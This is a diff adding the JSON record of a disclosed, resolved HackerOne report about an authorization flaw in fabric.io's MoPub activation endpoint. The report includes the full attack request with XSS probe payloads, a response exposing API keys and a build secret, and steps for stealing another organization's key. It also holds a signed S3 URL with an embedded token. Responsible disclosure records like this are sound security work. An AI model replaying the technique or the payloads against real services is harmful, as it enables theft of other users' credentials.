@@ -1,0 +1,120 @@
+{
+  "id": 95552,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NTU1Mg==",
+  "url": "https://hackerone.com/reports/95552",
+  "title": "IDOR- Activate Mopub on different organizations- steal api token- Fabric.io",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2015-10-24T07:40:42.855Z",
+  "submitted_at": "2015-10-24T07:40:42.855Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "akhil-reni",
+    "url": "/akhil-reni",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/iEozx7qMYfY94dxhXMs6ctPM/9a55e00ecd2cdf18a7f40678e6836e4cdc90bf95eb4b50c43f5fb775da40bb65"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 61,
+    "url": "https://hackerone.com/x",
+    "handle": "x",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/ikx4ept298unt534kpz4am2bd4zs/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "X (Formerly Twitter)",
+      "twitter_handle": "XSecurity",
+      "website": "https://x.com",
+      "about": "X helps you create and share ideas and information instantly, without barriers."
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-01-25T19:20:01.911Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-01-21T16:58:31.012Z",
+  "team_member_agreed_on_going_public_at": "2016-01-25T19:19:57.835Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Hello,**\n\nThere is an option to enroll your organization in fabric.io for mopub , but this particular end point is missing proper authorization checks allowing any user to steal API tokens.\n\nVulnerable request\n================\n```\nPOST /api/v3/organizations/5460d2394b793294df01104a/mopub/activate HTTP/1.1\nHost: fabric.io\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nX-CSRF-Token: 0jGxOZOgvkmucYubALnlQyoIlsSUBJ1VQxjw0qjp73A=\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-CRASHLYTICS-DEVELOPER-TOKEN: 0bb5ea45eb53fa71fa5758290be5a7d5bb867e77\nX-Requested-With: XMLHttpRequest\nReferer: https://fabric.io/img-srcx-onerrorprompt15/android/apps/app.myapplication/mopub\nContent-Length: 235\nCookie: <redacted>\nConnection: keep-alive\nPragma: no-cache\nCache-Control: no-cache\n\ncompany_name=dragoncompany&address1=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt(1)%3E&address2=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt(1)%3E&city=%22%3E%3Cimg+src%3Dx+onerror%3Dprompt(1)%3E&state=asdas&zip_code=50094&country_code=IN&link=false\n```\n\nResponse\n==================\n```\n{\"mopub_identity\":{\"id\":\"5496c76e8b15dabe9c0006d7\",\"confirmed\":true,\"primary\":false,\"service\":\"mopub\",\"token\":\"35592\"},\"organization\":{\"id\":\"5460d2394b793294df01104a\",\"name\":\"\\u003Ca href=\\\"javascript:alert(1);\\\"\\u003Es\\u003C/a\\u003E\\u003Ch1\\u003Etest\\u003C/h1\\u003E\",\"alias\":\"img-srcx-onerrorprompt1s-projects2\",\"api_key\":\"8590313c7382375063c2fe279a4487a98387767a\",\"enrollments\":{\"beta_distribution\":\"true\"},\"accounts_count\":3,\"apps_counts\":{\"android\":2},\"sdk_organization\":true,\"build_secret\":\"5ef0323f62d71c475611a635ea09a3132f037557d801503573b643ef8ad82054\",\"mopub_id\":\"33525\"}}\n```\n\nSteps to reproduce\n==================\n- create two accounts\n- note down organization id's from both the accounts\n- repeat the above request with organization id of B from account A\n- you will be able to steal victims mopub API key\n\nPOC screenshot attached.\n\n**Regards\nWeSecureApp**",
+  "weakness": {
+    "id": 27,
+    "name": "Improper Authentication - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 58589,
+      "file_name": "issue5.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/058/589/17a94709f9fd4f43a4d99b3dc6d11b2b7e9cd459/issue5.png?response-content-disposition=attachment%3B%20filename%3D%22issue5.png%22%3B%20filename%2A%3DUTF-8%27%27issue5.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQY5SNTJY%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T114744Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCop3Q63LW7Yv49h39we4XGKTgB9I7F6pJKpNEAG5240gIhAKwETGKrJzPr%2F7fM%2BGdJgnL4ieElyx642F%2B3bdwtyvMVKrIFCHAQAxoMMDEzNjE5Mjc0ODQ5IgxiJGR4b42ipezn2VQqjwWrA2dov7Kt2r6FlNqmUOd9MA4HZlBgL1aIs2MOL60HKsdB5AZvyhHiEBPXVQr4PRTgTp8Fi9ZMOPf3CAhXGbJjM9jp592k%2F7TreupWqubvRT868TwIa44%2BRxJqPSZCl254kSE6JQrHSLo4RI9TDYlrpANeUojlGlKylV9eTlYBndbRNzlqIOcwxONXEsxR818hC8%2BGtnVFIgATvsbSUH%2BiA0x7Lb32jiQVuy0oeZBUN5jX9t7XP7Jk7ecQsNQPi9QCNGheWGZgWQ8ddzaHm4csId42PSTSRLaQP5ntNNmd%2FZS5od6u37mLHNfS9V4v9e4pxXeT5WZtttJzE9Yys%2B8fmie4dZbg%2Bv2v%2Fp9p8KxHKm1rF7WKTRhCxwktkUkOyx9MAzKZeWr8PwnbUFm1cwRFNbUP8uLqBodTvabXBErW6EX1Kk50mcS1S2FwIz0UDayFMkzQ9KzbaWRrp3FrqWXtp5Z5yNZL%2BTlIv0TZiulPPU%2FaB6Q7FMNaN921cTtaFEpww368Ewb0eSXe76I3OkpT%2FGX%2FHtCYgzigJ7e5Vfb5IJgxhYd41G%2F0hpmJ%2FQ6wQyMFULMjyfrt8087O6e4BNzCrtGdfGH9m6KVsCGCh3lGYnc8VpsjPZjdftmAxBw9yds%2BVPnA62EUqSGd%2FoMQiStjwsf1c29bJFnctk2xMx4DUMKIWZoJ23jxOXwehPc7n14JsfnnVVG7RszDWeOdW624nWGdzWza36%2FDlclzHITfSbJTysPSrpPNaFgc0AnmZlVyb2thOsjfVj2wNKEOJa%2FAOjbcdoHiPxxPnQ0r1cfza05F92Aej%2FcNcVmqgKZwhrm7HX%2BYc1IKfOOz7M4P7Bhh7Ia6AcN95bPhcWLTZrmOMOGnrK4GOrABPXk11jqiK7cEnzOjvWGuSWl85sW7hizljGLFnEQMe4PXo5MCLGc8x7feomShfmj0rx927DYI79pdEmRhxSFaO9lFyhtZETXKtv3%2FvyXRabiLAGZzzkBQDRZUn%2Fr%2Fic3VGYzVuS6LhjMPI3o9Jo49wbqCEKynJJ5On5e3b2almIO4JNp3PvEktFAODdzTkgUrByaeTnasF6%2B80vs8pNG22RpLdF0sqmofolZbs%2F8BX30%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=833fef0b8fa981862050c81cdad41ca829bd647dae204291079d1aeb5e162e0e",
+      "file_size": 150380,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-02-20T16:58:34.899Z",
+  "allow_singular_disclosure_after": -251837350.06774586,
+  "singular_disclosure_allowed": true,
+  "vote_count": 12,
+  "voters": [
+    "michiel",
+    "tess",
+    "mak",
+    "eveeez",
+    "lumbridge",
+    "rashedul_css",
+    "shivammusic",
+    "911",
+    "safisecu",
+    "eyad_hamza",
+    "and 2 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
